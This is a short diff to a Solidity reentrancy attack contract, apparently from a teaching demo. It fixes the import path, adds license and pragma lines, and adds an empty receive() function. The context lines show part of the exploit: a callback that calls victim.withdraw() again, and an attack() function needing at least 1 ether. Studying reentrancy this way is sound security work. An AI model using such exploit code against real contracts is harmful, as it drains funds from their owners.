@@ -1,4 +1,7 @@
-import "/ReEntrancy.sol";
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "./ReEntrancy.sol";
 
 contract Attack {
     ReEntrancy public victim;
@@ -13,6 +16,9 @@ contract Attack {
             victim.withdraw();
         }
     }
+
+    // To get rid of the warning
+    receive() external payable {}
 
     function attack() external payable {
         require(msg.value >= 1 ether);
